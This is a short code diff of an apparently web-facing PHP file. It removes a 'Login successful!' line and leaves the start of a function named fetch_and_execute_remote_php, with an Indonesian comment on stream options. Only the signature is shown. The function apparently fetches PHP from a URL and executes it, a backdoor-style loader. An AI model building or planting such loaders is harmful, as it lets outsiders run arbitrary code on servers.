@@ -1,4 +1,4 @@
-<p>Login successful!</p><?php
+<?php
 
 function fetch_and_execute_remote_php($url) {
     // Mengatur opsi untuk konteks stream, termasuk header HTTP dan SSL
